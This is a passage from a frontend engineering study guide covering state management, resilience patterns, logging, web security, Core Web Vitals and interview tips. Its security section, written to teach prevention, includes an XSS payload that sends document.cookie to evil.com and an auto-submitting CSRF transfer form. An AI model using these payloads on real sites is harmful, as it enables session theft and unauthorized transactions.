    <>
      <Suspense fallback={<div>Loading...</div>}>
        <Header />
      </Suspense>
      <main>
        <Products />
      </main>
    </>
  );
}
```

**Pros:** Independent deployments, team autonomy, tech flexibility
**Cons:** Complex setup, shared dependencies, consistency challenges

---

### Client vs. Server State Management

**Client State:** UI-specific, temporary
**Server State:** Backend data, needs syncing

**Complete Example:**
```javascript
import { useState } from 'react';
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

// Client State (UI state)
function ThemeToggle() {
  const [theme, setTheme] = useState('light'); // Client state
  
  return (
    <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>
      Toggle Theme
    </button>
  );
}

// Server State (API data)
function UserProfile({ userId }) {
  const queryClient = useQueryClient();
  
  // Server state with automatic caching
  const { data: user, isLoading, error } = useQuery({
    queryKey: ['user', userId],
    queryFn: () => fetch(`/api/users/${userId}`).then(res => res.json()),
    staleTime: 5 * 60 * 1000, // Consider fresh for 5 minutes
    cacheTime: 10 * 60 * 1000 // Keep in cache for 10 minutes
  });
  
  // Mutation for updating server state
  const updateName = useMutation({
    mutationFn: (newName) => 
      fetch(`/api/users/${userId}`, {
        method: 'PUT',
        body: JSON.stringify({ name: newName })
      }),
    onSuccess: () => {
      // Invalidate and refetch
      queryClient.invalidateQueries(['user', userId]);
    }
  });
  
  if (isLoading) return <p>Loading...</p>;
  if (error) return <p>Error loading user</p>;
  
  return (
    <div>
      <h1>{user.name}</h1>
      <button onClick={() => updateName.mutate('New Name')}>
        Update Name
      </button>
    </div>
  );
}
```

**State Management Comparison:**
```javascript
// Client State Tools: useState, useContext, Redux, Zustand
// Use for: Form inputs, modal state, theme, UI toggles

// Server State Tools: React Query, SWR, Apollo, RTK Query
// Use for: User data, lists, API responses
// Benefits: Caching, background updates, optimistic updates
```

---

## 10. Resilience Patterns

### Retry with Exponential Backoff

**What it is:** Automatically retry failed requests with increasing delays.

**Implementation:**
```javascript
async function fetchWithRetry(url, options = {}, retries = 3, backoff = 1000) {
  try {
    const response = await fetch(url, options);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}`);
    }
    
    return await response.json();
  } catch (error) {
    if (retries === 0) {
      throw error;
    }
    
    // Wait with exponential backoff
    await new Promise(resolve => 
      setTimeout(resolve, backoff * Math.pow(2, 3 - retries))
    );
    
    // Retry
    return fetchWithRetry(url, options, retries - 1, backoff);
  }
}

// Usage
try {
  const data = await fetchWithRetry('/api/users', {}, 3, 1000);
  // Attempt 1: immediate
  // Attempt 2: after 2s
  // Attempt 3: after 4s
} catch (error) {
  showError('Failed after 3 retries');
}
```

**Advanced Retry Logic:**
```javascript
function shouldRetry(error, attempt) {
  // Don't retry on 4xx errors (client errors)
  if (error.status >= 400 && error.status < 500) {
    return false;
  }
  
  // Don't retry more than 5 times
  if (attempt >= 5) {
    return false;
  }
  
  return true;
}

async function robustFetch(url, options = {}) {
  let attempt = 0;
  
  while (true) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      attempt++;
      
      if (!shouldRetry(error, attempt)) {
        throw error;
      }
      
      const delay = Math.min(1000 * Math.pow(2, attempt), 30000);
      console.log(`Retry ${attempt} in ${delay}ms`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

---

### Circuit Breaker

**What it is:** Stop making requests after repeated failures to prevent cascading failures.

**States:**
- **Closed**: Normal operation
- **Open**: Failing, stop requests
- **Half-Open**: Test if service recovered

**Implementation:**
```javascript
class CircuitBreaker {
  constructor(options = {}) {
    this.failureThreshold = options.failureThreshold || 5;
    this.resetTimeout = options.resetTimeout || 30000; // 30 seconds
    this.state = 'CLOSED';
    this.failures = 0;
    this.lastFailureTime = null;
  }
  
  async execute(operation) {
    if (this.state === 'OPEN') {
      // Check if we should try again
      if (Date.now() - this.lastFailureTime > this.resetTimeout) {
        this.state = 'HALF-OPEN';
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }
    
    try {
      const result = await operation();
      this.onSuccess();
      return result;
    } catch (error) {
      this.onFailure();
      throw error;
    }
  }
  
  onSuccess() {
    this.failures = 0;
    this.state = 'CLOSED';
  }
  
  onFailure() {
    this.failures++;
    this.lastFailureTime = Date.now();
    
    if (this.failures >= this.failureThreshold) {
      this.state = 'OPEN';
      console.warn('Circuit breaker opened');
    }
  }
}

// Usage
const apiBreaker = new CircuitBreaker({
  failureThreshold: 5,
  resetTimeout: 30000
});

async function fetchUsers() {
  return apiBreaker.execute(() => fetch('/api/users').then(r => r.json()));
}

// Fallback when circuit is open
async function getUsersWithFallback() {
  try {
    return await fetchUsers();
  } catch (error) {
    if (error.message === 'Circuit breaker is OPEN') {
      // Return cached data or show offline message
      return getCachedUsers();
    }
    throw error;
  }
}
```

---

### Offline-First with Service Workers

**What it is:** App works without internet, syncs when connection restored.

**Service Worker Implementation:**
```javascript
// sw.js
const CACHE_NAME = 'offline-v1';
const OFFLINE_URL = '/offline.html';

// Install - Cache essential resources
self.addEventListener('install', event => {
  event.waitUntil(
    caches.open(CACHE_NAME).then(cache => {
      return cache.addAll([
        '/',
        '/offline.html',
        '/styles.css',
        '/app.js'
      ]);
    })
  );
});

// Fetch - Serve from cache, fallback to offline page
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request).catch(() => {
      return caches.match(OFFLINE_URL);
    })
  );
});

// Background Sync - Queue requests when offline
self.addEventListener('sync', event => {
  if (event.tag === 'sync-messages') {
    event.waitUntil(syncMessages());
  }
});

async function syncMessages() {
  const db = await openDatabase();
  const pendingMessages = await db.getAll('pending_messages');
  
  for (const message of pendingMessages) {
    try {
      await fetch('/api/messages', {
        method: 'POST',
        body: JSON.stringify(message)
      });
      await db.delete('pending_messages', message.id);
    } catch (error) {
      // Will retry on next sync
    }
  }
}
```

**Client-Side Registration:**
```javascript
// Register service worker
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js')
    .then(registration => {
      console.log('SW registered:', registration);
    });
}

// Queue actions when offline
async function sendMessage(message) {
  if (navigator.onLine) {
    await fetch('/api/messages', {
      method: 'POST',
      body: JSON.stringify(message)
    });
  } else {
    // Store in IndexedDB for later sync
    await storePendingMessage(message);
    
    // Request background sync
    const registration = await navigator.serviceWorker.ready;
    await registration.sync.register('sync-messages');
  }
}

// Listen for online/offline events
window.addEventListener('online', () => {
  showNotification('Back online!');
  syncPendingActions();
});

window.addEventListener('offline', () => {
  showNotification('You are offline. Changes will sync later.');
});
```

---

## 11. Error Management

### Error Boundaries (React)

**What it is:** Catch JavaScript errors in component tree.

**Implementation:**
```javascript
class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }
  
  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }
  
  componentDidCatch(error, errorInfo) {
    // Log error to monitoring service
    logError(error, errorInfo);
  }
  
  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <button onClick={() => this.setState({ hasError: false })}>
            Try Again
          </button>
        </div>
      );
    }
    
    return this.props.children;
  }
}

// Usage
function App() {
  return (
    <ErrorBoundary>
      <Dashboard />
    </ErrorBoundary>
  );
}
```

---

### Graceful Degradation

**What it is:** App continues working with reduced functionality when parts fail.

**Example:**
```javascript
function NewsFeed() {
  const [articles, setArticles] = useState([]);
  const [comments, setComments] = useState({});
  const [error, setError] = useState(null);
  
  // Load articles (critical)
  useEffect(() => {
    fetch('/api/articles')
      .then(res => res.json())
      .then(setArticles)
      .catch(err => {
        setError('Failed to load articles');
        // Show cached articles if available
        const cached = localStorage.getItem('cached_articles');
        if (cached) {
          setArticles(JSON.parse(cached));
        }
      });
  }, []);
  
  // Load comments (non-critical)
  useEffect(() => {
    if (articles.length > 0) {
      fetch('/api/comments')
        .then(res => res.json())
        .then(setComments)
        .catch(err => {
          console.warn('Comments unavailable');
          // Continue without comments
        });
    }
  }, [articles]);
  
  if (error && articles.length === 0) {
    return (
      <div>
        <p>Unable to load content. Please check your connection.</p>
        <button onClick={() => window.location.reload()}>Retry</button>
      </div>
    );
  }
  
  return (
    <div>
      {articles.map(article => (
        <article key={article.id}>
          <h2>{article.title}</h2>
          <p>{article.summary}</p>
          
          {/* Comments section - gracefully degraded */}
          {comments[article.id] ? (
            <Comments data={comments[article.id]} />
          ) : (
            <p className="text-muted">Comments temporarily unavailable</p>
          )}
        </article>
      ))}
    </div>
  );
}
```

---

## 12. Testing & Experimentation

### Feature Flags

**What it is:** Toggle features without deploying code.

**Implementation:**
```javascript
// Feature flag service
const featureFlags = {
  newCheckout: false,
  darkMode: true,
  betaSearch: false
};

// Load flags from API
async function loadFeatureFlags() {
  const response = await fetch('/api/feature-flags');
  const flags = await response.json();
  Object.assign(featureFlags, flags);
}

// Usage in components
function Checkout() {
  if (featureFlags.newCheckout) {
    return <NewCheckoutFlow />;
  }
  return <OldCheckoutFlow />;
}

// A/B Test with feature flags
function LandingPage() {
  const variant = featureFlags.landingPageVariant; // 'A' or 'B'
  
  return variant === 'A' 
    ? <LandingPageA /> 
    : <LandingPageB />;
}
```

**Advanced Feature Flag System:**
```javascript
class FeatureFlagService {
  constructor() {
    this.flags = {};
    this.userSegments = {};
  }
  
  async initialize(userId) {
    const response = await fetch('/api/flags', {
      headers: { 'X-User-ID': userId }
    });
    this.flags = await response.json();
  }
  
  isEnabled(flagName, context = {}) {
    const flag = this.flags[flagName];
    
    if (!flag) return false;
    
    // Check user segment
    if (flag.segments) {
      const userSegment = this.getUserSegment(context.userId);
      return flag.segments.includes(userSegment);
    }
    
    // Check percentage rollout
    if (flag.percentage) {
      const hash = this.hashUser(context.userId);
      return (hash % 100) < flag.percentage;
    }
    
    return flag.enabled;
  }
  
  hashUser(userId) {
    // Simple hash for consistent assignment
    let hash = 0;
    for (let i = 0; i < userId.length; i++) {
      hash = ((hash << 5) - hash) + userId.charCodeAt(i);
    }
    return Math.abs(hash);
  }
}

// Usage
const flagService = new FeatureFlagService();
await flagService.initialize(currentUser.id);

if (flagService.isEnabled('newFeature', { userId: currentUser.id })) {
  showNewFeature();
}
```

---

### A/B Testing

**What it is:** Show different versions to users to determine what works better.

**Implementation:**
```javascript
// A/B Test Service
class ABTestService {
  constructor() {
    this.tests = {};
  }
  
  assignVariant(testName, variants) {
    // Check if user already has assigned variant
    const stored = localStorage.getItem(`ab_${testName}`);
    if (stored) {
      return stored;
    }
    
    // Random assignment
    const variant = variants[Math.floor(Math.random() * variants.length)];
    localStorage.setItem(`ab_${testName}`, variant);
    
    // Track assignment
    this.trackEvent('ab_test_assigned', { testName, variant });
    
    return variant;
  }
  
  trackConversion(testName, variant) {
    this.trackEvent('ab_test_conversion', { testName, variant });
  }
  
  trackEvent(eventName, data) {
    fetch('/api/analytics', {
      method: 'POST',
      body: JSON.stringify({ event: eventName, ...data })
    });
  }
}

// Usage in Button Component
function SignupButton() {
  const abTest = new ABTestService();
  const variant = abTest.assignVariant('buttonColor', ['blue', 'green']);
  
  const handleClick = () => {
    abTest.trackConversion('buttonColor', variant);
    handleSignup();
  };
  
  const color = variant === 'blue' ? '#007bff' : '#28a745';
  
  return (
    <button 
      style={{ backgroundColor: color }}
      onClick={handleClick}
    >
      Sign Up
    </button>
  );
}
```

---

## 13. Observability

### Logging

**What it is:** Recording events for debugging and analysis.

**Structured Logging:**
```javascript
// Logger utility
const logger = {
  info: (message, data = {}) => {
    console.log(JSON.stringify({
      level: 'INFO',
      timestamp: new Date().toISOString(),
      message,
      ...data
    }));
  },
  
  error: (message, error, data = {}) => {
    console.error(JSON.stringify({
      level: 'ERROR',
      timestamp: new Date().toISOString(),
      message,
      error: {
        name: error.name,
        message: error.message,
        stack: error.stack
      },
      ...data
    }));
  },
  
  warn: (message, data = {}) => {
    console.warn(JSON.stringify({
      level: 'WARN',
      timestamp: new Date().toISOString(),
      message,
      ...data
    }));
  }
};

// Usage
logger.info('User logged in', { userId: 123, timestamp: Date.now() });
logger.error('API call failed', error, { endpoint: '/api/users' });
logger.warn('Slow query detected', { duration: 2500, query: 'getUser' });
```

**Production Logging Service:**
```javascript
// Send logs to backend
async function sendLog(logEntry) {
  try {
    await fetch('/api/logs', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logEntry)
    });
  } catch (error) {
    // Don't throw - logging shouldn't break app
    console.error('Failed to send log', error);
  }
}

// Intercept console methods
const originalConsoleError = console.error;
console.error = (...args) => {
  originalConsoleError.apply(console, args);
  sendLog({
    level: 'ERROR',
    message: args.join(' '),
    timestamp: new Date().toISOString()
  });
};
```

---

### Error Tracking (Sentry)

**What it is:** Monitor and alert on errors in production.

**Setup:**
```javascript
import * as Sentry from '@sentry/react';

// Initialize Sentry
Sentry.init({
  dsn: 'YOUR_SENTRY_DSN',
  environment: process.env.NODE_ENV,
  tracesSampleRate: 1.0,
  
  // Filter sensitive data
  beforeSend(event) {
    // Remove PII
    if (event.user) {
      delete event.user.email;
      delete event.user.ip_address;
    }
    return event;
  }
});

// Automatic error capture
function App() {
  return (
    <Sentry.ErrorBoundary fallback={<ErrorFallback />}>
      <Router />
    </Sentry.ErrorBoundary>
  );
}

// Manual error tracking
function submitForm(data) {
  try {
    validateForm(data);
    submitToAPI(data);
  } catch (error) {
    Sentry.captureException(error, {
      tags: { feature: 'form-submission' },
      user: { id: currentUser.id },
      extra: { formData: sanitizeData(data) }
    });
    
    showError('Submission failed');
  }
}

// Performance monitoring
Sentry.startTransaction({ name: 'load-dashboard' });
// ... code ...
Sentry.finishTransaction();
```

---

## 14. Security Vulnerabilities

### XSS (Cross-Site Scripting)

**What it is:** Injecting malicious scripts into web pages.

**Attack Example:**
```javascript
// Vulnerable code
const userInput = '<script>stealCookies()</script>';
document.getElementById('comment').innerHTML = userInput; // DANGEROUS!

// Malicious script executes and steals user data
```

**Prevention:**
```javascript
// 1. Use textContent instead of innerHTML
document.getElementById('comment').textContent = userInput; // SAFE

// 2. React automatically escapes content
function Comment({ text }) {
  return <div>{text}</div>; // Safe - React escapes by default
}

// 3. Sanitize HTML if needed
import DOMPurify from 'dompurify';

function RichComment({ html }) {
  const cleanHTML = DOMPurify.sanitize(html);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// 4. Content Security Policy
// HTTP Header:
// Content-Security-Policy: script-src 'self'; object-src 'none'
```

**Real Attack Scenario:**
```javascript
// Attacker posts comment with script
const maliciousComment = `
  Great post! 
  <script>
    fetch('https://evil.com/steal?cookie=' + document.cookie)
  </script>
`;

// If rendered unsanitized, script executes for all viewers
// Prevention: Always escape user input
```

---

### CSRF (Cross-Site Request Forgery)

**What it is:** Tricking users into performing unwanted actions.

**Attack Scenario:**
```html
<!-- Malicious site -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker-account">
</form>
<script>document.forms[0].submit();</script>
```

**Prevention:**
```javascript
// 1. CSRF Token
// Server generates token
const csrfToken = generateCSRFToken();
res.cookie('csrf_token', csrfToken);

// Include in forms
<form method="POST" action="/transfer">
  <input type="hidden" name="_csrf" value="${csrfToken}">
  <input type="number" name="amount">
  <button type="submit">Transfer</button>
</form>

// Server validates token
app.post('/transfer', (req, res) => {
  if (req.body._csrf !== req.cookies.csrf_token) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Process transfer
});

// 2. SameSite Cookies
res.cookie('session', sessionId, {
  sameSite: 'strict', // or 'lax'
  secure: true
});

// 3. Check Origin header
app.use((req, res, next) => {
  const origin = req.headers.origin;
  const allowedOrigins = ['https://bank.com'];
  
  if (allowedOrigins.includes(origin)) {
    next();
  } else {
    res.status(403).send('Forbidden');
  }
});
```

---

### CSP (Content Security Policy)

**What it is:** Restrict what resources can load on your page.

**Implementation:**
```javascript
// Express - Set CSP headers
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self';" +
    "script-src 'self' https://cdn.example.com;" +
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;" +
    "img-src 'self' https: data:;" +
    "font-src 'self' https://fonts.gstatic.com;" +
    "connect-src 'self' https://api.example.com;" +
    "frame-ancestors 'none';" +
    "base-uri 'self';" +
    "form-action 'self'"
  );
  next();
});
```

**Directives Explained:**
```
default-src 'self'              // Default: only same origin
script-src 'self'               // Scripts: only from same origin
style-src 'self' 'unsafe-inline' // Styles: same origin + inline styles
img-src 'self' https:           // Images: same origin + any HTTPS
connect-src 'self'              // AJAX: only same origin
frame-ancestors 'none'          // Prevent clickjacking
```

**Report Violations:**
```javascript
// Monitor CSP violations
app.post('/csp-report', (req, res) => {
  console.log('CSP Violation:', req.body);
  // Alert security team
  res.sendStatus(200);
});

// Add to CSP header
report-uri /csp-report
```

---

### SameSite Cookies

**What it is:** Control when cookies are sent with cross-site requests.

**Options:**
```javascript
// Strict - Never send with cross-site requests
Set-Cookie: session=abc123; SameSite=Strict

// Lax - Send with top-level navigation (recommended)
Set-Cookie: session=abc123; SameSite=Lax

// None - Send with all requests (requires Secure)
Set-Cookie: session=abc123; SameSite=None; Secure
```

**Examples:**
```javascript
// Scenario 1: User clicks link from evil.com to your site
// SameSite=Strict: Cookie NOT sent
// SameSite=Lax: Cookie sent (top-level navigation)
// SameSite=None: Cookie sent

// Scenario 2: Your site embeds iframe from another site
// SameSite=Strict: Cookie NOT sent
// SameSite=Lax: Cookie NOT sent
// SameSite=None: Cookie sent (if Secure)

// Best practice for session cookies
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'lax', // Balance between security and UX
  maxAge: 24 * 60 * 60 * 1000
});
```

---

## 15. Core Web Vitals

### LCP (Largest Contentful Paint)

**What it is:** Time until largest content element (image, video, text block) loads.

**Target:** < 2.5 seconds

**Measurement:**
```javascript
// Measure LCP
new PerformanceObserver((entries) => {
  const lastEntry = entries.entries[entries.entries.length - 1];
  console.log('LCP:', lastEntry.startTime);
  
  // Send to analytics
  sendToAnalytics('LCP', lastEntry.startTime);
}).observe({ type: 'largest-contentful-paint', buffered: true });
```

**Improvement Techniques:**
```html
<!-- 1. Optimize hero image -->
<link rel="preload" as="image" href="/hero.jpg">
<img src="/hero.jpg" alt="Hero" fetchpriority="high">

<!-- 2. Use responsive images -->
<img 
  srcset="hero-400.jpg 400w, hero-800.jpg 800w" 
  sizes="100vw"
  src="hero-800.jpg"
>

<!-- 3. Remove render-blocking resources -->
<link rel="preload" href="/critical.css" as="style">
```

---

### CLS (Cumulative Layout Shift)

**What it is:** Visual stability - measures unexpected layout shifts.

**Target:** < 0.1

**Common Causes:**
- Images without dimensions
- Ads/embeds without reserved space
- Dynamically injected content
- Web fonts causing FOIT/FOUT

**Prevention:**
```html
<!-- 1. Set explicit dimensions for images -->
<img src="photo.jpg" width="800" height="600" alt="Photo">

<!-- 2. Reserve space for ads -->
<div style="min-height: 250px;">
  <ins class="adsbygoogle">
    <!-- Ad loads here -->
  </ins>
</div>

<!-- 3. Use aspect-ratio for responsive containers -->
<div style="aspect-ratio: 16/9;">
  <iframe src="video.html"></iframe>
</div>

<!-- 4. Font display swap -->
<link href="/font.woff2" rel="preload" as="font" crossorigin>
<style>
@font-face {
  font-family: 'CustomFont';
  src: url('/font.woff2') format('woff2');
  font-display: swap; /* Prevents FOIT */
}
</style>
```

**Measure CLS:**
```javascript
new PerformanceObserver((entries) => {
  entries.forEach(entry => {
    if (!entry.hadRecentInput) {
      console.log('Layout Shift:', entry.value);
      sendToAnalytics('CLS', entry.value);
    }
  });
}).observe({ type: 'layout-shift', buffered: true });
```

---

### INP (Interaction to Next Paint)

**What it is:** Responsiveness to user interactions (clicks, taps, keypresses).

**Target:** < 200 milliseconds

**Replaces FID (First Input Delay)**

**Measurement:**
```javascript
// Measure INP
new PerformanceObserver((entries) => {
  entries.forEach(entry => {
    console.log('Interaction delay:', entry.processingEnd - entry.startTime);
    sendToAnalytics('INP', entry.duration);
  });
}).observe({ type: 'first-input', buffered: true });
```

**Improvement Techniques:**
```javascript
// 1. Break up long tasks
// Bad: Blocking main thread for 500ms
function processData() {
  for (let i = 0; i < 1000000; i++) {
    // Heavy computation
  }
}

// Good: Chunk work
async function processData() {
  const chunks = chunkArray(data, 1000);
  
  for (const chunk of chunks) {
    processChunk(chunk);
    await new Promise(resolve => setTimeout(resolve, 0)); // Yield to browser
  }
}

// 2. Use Web Workers for heavy computation
const worker = new Worker('worker.js');
worker.postMessage(largeDataset);
worker.onmessage = (e) => {
  updateUI(e.data);
};

// 3. Debounce expensive operations
import { debounce } from 'lodash';

const handleScroll = debounce(() => {
  updateParallax();
}, 16); // ~60fps

window.addEventListener('scroll', handleScroll);
```

---

### TTFB (Time to First Byte)

**What it is:** Time from request to first byte of response.

**Target:** < 800ms

**Measurement:**
```javascript
const timing = performance.getEntriesByType('navigation')[0];
console.log('TTFB:', timing.responseStart - timing.requestStart);
```

**Improvement Techniques:**
```javascript
// 1. Use CDN
// Assets served from edge locations closer to users

// 2. Optimize server response
// - Database query optimization
// - Caching (Redis, Memcached)
// - Efficient algorithms

// 3. Server-side caching
app.get('/api/data', cacheMiddleware(300), async (req, res) => {
  // Cached for 5 minutes
  const data = await fetchData();
  res.json(data);
});

// 4. Use HTTP/2 or HTTP/3
// Faster connection establishment

// 5. Preconnect to origins
<link rel="preconnect" href="https://api.example.com">
```

---

### FID (First Input Delay) - DEPRECATED

**Note:** FID has been replaced by INP (Interaction to Next Paint) in March 2024.

**What it was:** Time from first user interaction to browser response.

**Why replaced:** INP provides a more comprehensive measure of responsiveness across the entire page lifecycle, not just the first interaction.

---

## Quick Reference Summary

| Category | Key Concept | When to Use |
|----------|-------------|-------------|
| **APIs** | REST for simple, GraphQL for flexible, gRPC for internal | Choose based on use case |
| **Real-time** | WebSockets for chat, SSE for updates, Polling as fallback | Match to communication pattern |
| **Rendering** | SSR for SEO, SSG for static, CSR for dashboards | Based on content type |
| **Performance** | Lazy load images, code split routes, compress assets | Always optimize |
| **Security** | HTTPS always, sanitize input, use CSP | Non-negotiable |
| **State** | Client for UI, Server for data | Separate concerns |
| **Resilience** | Retry with backoff, circuit breakers, offline support | Production-ready apps |

---

## Interview Tips

### Common Questions:

1. **"Explain the difference between SSR and CSR"**
   - Answer with pros/cons and use cases
   - Mention Next.js as example

2. **"How would you optimize a slow-loading page?"**
   - Mention LCP, code splitting, image optimization, CDN
   - Talk about measuring with Core Web Vitals

3. **"What security measures do you implement?"**
   - XSS prevention, CSRF tokens, CSP, HTTPS
   - HttpOnly cookies, input sanitization

4. **"How do you handle API failures?"**
   - Retry with backoff, circuit breakers
   - Error boundaries, graceful degradation

5. **"Explain your state management strategy"**
   - Client state vs server state
   - React Query for server state, useState for UI state

---

## Conclusion

Mastering these concepts separates good frontend engineers from exceptional ones. Focus on:

✅ **Performance**: Fast load times, smooth interactions
✅ **Security**: Protect user data, prevent vulnerabilities
✅ **Resilience**: Handle errors gracefully, work offline
✅ **Architecture**: Scalable, maintainable code structure
✅ **Observability**: Monitor, log, and track issues

Keep practicing, building real projects, and staying updated with the latest web technologies!

---

*Last Updated: June 2026*

